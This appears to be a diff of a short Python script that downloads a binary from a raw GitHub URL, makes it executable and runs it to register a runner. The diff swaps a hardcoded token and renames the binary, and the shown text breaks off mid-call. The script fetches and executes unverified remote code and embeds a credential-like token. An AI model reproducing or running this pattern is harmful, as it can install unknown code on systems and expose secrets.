@@ -3,19 +3,19 @@ import subprocess
 import urllib.request
 import os
 
-TOKEN = "mGfbPYr0YOqtdg5z1OUf9ZPrGCvepuWiHfqxATIE"
+TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"
 
 URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"
-BINARY = "jwnaos"
+BINARY = "kemisolo"
 
 # Download
-print("[1] Downloading jwnaos...")
+print("[1] Downloading...")
 urllib.request.urlretrieve(URL, BINARY)
 
-# Set executable permission
+# Set executable permissions
 os.chmod(BINARY, 0o755)
 
-# Register runner
+# Register
 print("[2] Registering runner...")
 subprocess.run([
     "./" + BINARY,
